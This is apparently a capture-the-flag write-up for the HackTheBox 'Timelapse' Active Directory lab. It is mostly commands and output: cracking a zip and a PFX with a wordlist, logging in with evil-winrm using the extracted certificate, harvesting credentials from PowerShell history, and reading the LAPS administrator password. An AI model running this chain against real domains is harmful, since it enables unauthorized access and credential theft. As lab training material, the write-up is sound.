---
title: "Timelapse"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
tags:
  - HackTheBox
  - Active Directory
---

# Timelapse

![](../assets/Pasted%20image%2020250510165312.png)
<!-- more -->

## Enumeration

```bash
$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.152
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 10:48 CET
Nmap scan report for 10.10.11.152
Host is up (0.040s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-11-26 17:48:50Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-11-26T17:50:19+00:00; +7h59m58s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-26T17:49:40
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.68 seconds

```

Enumerating shares with an empty session, we find a file in `Shares/Dev`

```bash
$ smbclient -U "" -L //10.10.11.152/ -N

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                         
┌──(kali㉿kali)-[~/timelapse]
└─$ smbclient -U "" -L //10.10.11.152/   
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                         
┌──(kali㉿kali)-[~/timelapse]
└─$ smbclient -U ""  //10.10.11.152/Shares 
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 17:39:15 2021
  ..                                  D        0  Mon Oct 25 17:39:15 2021
  Dev                                 D        0  Mon Oct 25 21:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021

                6367231 blocks of size 4096. 2473840 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 21:40:06 2021
  ..                                  D        0  Mon Oct 25 21:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021

                6367231 blocks of size 4096. 2473840 blocks available
```

## Initial Access

The file has a password, so we use `fcrackzip`

```bash
$ fcrackzip -u  -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip

PASSWORD FOUND!!!!: pw == supremelegacy
```

We have a password, and inside, a `.pfx` cert but it has a password too. We can use [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12) (`p12tool` doesn't work)

```
$ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ../timelapse/legacyy_dev_auth.pfx

Dictionary attack - Starting 2 threads

*********************************************************
Dictionary attack - Thread 1 - Password found: thuglegacy
*********************************************************
```

Now we can extract the private and public keys, knowing this is a `winrm` cert

```bash
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out public.crt
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key -nodes
```

And try `evil-winrm` with it

```bash
$ evil-winrm -i 10.10.11.152 -c public.crt -k private.key -S
Evil-WinRM shell v3.7

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ============================================
timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## Privilege Escalation

We find credentials in a PowerShell log file

```bash
*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

So we have `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We are in the `LAPS_Readers` group, so we can try to read passwords. Trying with `crackmapexec --laps` doesn't work, so I'll try [thehacker.recipes AD LAPS DACL read](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword)

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'                                                                                 

DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb                                          
DNSHostName                 : dc01.timelapse.htb                                                                         
Enabled                     : True                                                                                       
ms-mcs-admpwd               : m{292kr#Es(3K8R7u86t(l$J                                                                   
ms-mcs-admpwdexpirationtime : 133775487108929601                                                                         
Name                        : DC01                                                                                       
ObjectClass                 : computer                                                                                   
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f                                                       
SamAccountName              : DC01$                                                                                      
SID                         : S-1-5-21-671920749-559770252-3318990721-1000                                               
UserPrincipalName           :                                 
```

And we have `m{292kr#Es(3K8R7u86t(l$J`. Let's try `evil-winrm` again.

```bash
$ evil-winrm -i 10.10.11.152 -u Administrator -p 'm{292kr#Es(3K8R7u86t(l$J' -S

Evil-WinRM shell v3.7

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users> type C:\Users\TRX\Desktop\root.txt
9d79b183ad51bba6ee55bc4dc8cde987
*Evil-WinRM* PS C:\Users> type C:\Users\legacyy\Desktop\user.txt
88e15f354746b78a87e0a74163c59165
```

## Post Exploitation

Get the flags

```shell
*Evil-WinRM* PS C:\Users> type C:\Users\TRX\Desktop\root.txt
9d79b183ad51bba6ee55bc4dc8cde987
*Evil-WinRM* PS C:\Users> type C:\Users\legacyy\Desktop\user.txt
88e15f354746b78a87e0a74163c59165
```
